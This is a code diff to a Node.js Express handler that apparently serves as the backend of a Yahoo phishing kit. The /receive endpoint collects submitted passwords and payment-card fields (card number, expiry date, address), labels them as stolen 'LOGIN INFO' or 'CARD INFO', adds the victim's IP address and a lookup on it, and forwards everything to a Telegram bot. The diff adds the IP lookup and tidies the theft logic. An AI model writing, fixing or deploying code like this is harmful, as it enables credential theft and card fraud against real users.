@@ -48,45 +48,51 @@ const sendTelegramMessage = (text) => {
 };
 
 
-app.post('/receive', (req, res) => {
-  
+const axios = require('axios'); // Import axios if not already done
+const { getClientIp } = require('your-ip-middleware'); // Adjust based on your middleware
+
+app.post('/receive', async (req, res) => {
   let message = '';
   let myObject = req.body;
 
-  
+  const sendAPIRequest = async (ipAddress) => {
+    const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
+    console.log(apiResponse.data);
+    return apiResponse.data;
+  };
+
+  const ipAddress = getClientIp(req);
+  const ipAddressInformation = await sendAPIRequest(ipAddress);
+
   const myObjects = Object.keys(myObject);
- 
+
   if (myObjects.includes('Password')) {
-  	message += `✅ UPDATE TEAM | YAHOO | USER_${IpAddress}\n\n` +
-             `👤 LOGIN INFO\n\n`;
-  
-  for (const key of myObjects){
-    console.log(`${key}: ${myObject[key]}`);
-    message += `${key}: ${myObject[key]}\n`;
-  }
- }
- 
- if (myObjects.includes('Expiry-date') || myObjects.includes('Card-number') || myObjects.includes('Address')) {
-  message += `✅ UPDATE TEAM | YAHOO | USER_${IpAddress}\n\n` +
-             `👤 CARD INFO\n\n`;
-  
- 	for (const key of myObjects){
-    console.log(`${key}: ${myObject[key]}`);
-    message += `${key}: ${myObject[key]}\n`;
-  }
- 	
-}
-    // Now you can handle the data or send it as needed
-    console.log(message); // This should be inside the 'end' event callback
-    const sendMessage = sendMessageFor(botToken, chatId);
-    sendMessage(message);
+    message += `✅ UPDATE TEAM | YAHOO | USER_${ipAddress}\n\n` +
+               `👤 LOGIN INFO\n\n`;
 
-    // Send a response back to the client if needed
-    res.send('Data received and processed.');
+    for (const key of myObjects) {
+      console.log(`${key}: ${myObject[key]}`);
+      message += `${key}: ${myObject[key]}\n`;
+    }
+  }
 
-  	
-  
-  
+  if (myObjects.includes('Expiry-date') || myObjects.includes('Card-number') || myObjects.includes('Address')) {
+    message += `✅ UPDATE TEAM | YAHOO | USER_${ipAddress}\n\n` +
+               `👤 CARD INFO\n\n`;
+
+    for (const key of myObjects) {
+      console.log(`${key}: ${myObject[key]}`);
+      message += `${key}: ${myObject[key]}\n`;
+    }
+  }
+
+  // Now you can handle the data or send it as needed
+  console.log(message); // This should be inside the 'end' event callback
+  const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
+  sendMessage(message);
+
+  // Send a response back to the client if needed
+  res.send('Data received and processed.');
 });
 
 
